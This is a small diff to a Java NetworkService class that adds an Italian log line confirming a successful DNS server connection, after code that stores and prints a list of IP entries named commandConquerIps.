@@ -282,7 +282,7 @@ public class NetworkService {
 			cec.setValue2(pki.rebuildPuK(result.getValue2()));
 			commandConquerIps.add(cec);
 			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
-			
+			System.out.println("Connessione con DNS server OK");
 			return Boolean.TRUE;
 			} catch (Exception ex) {
 			System.err.println("Errore durante la richiesta di IP\n" + ex);
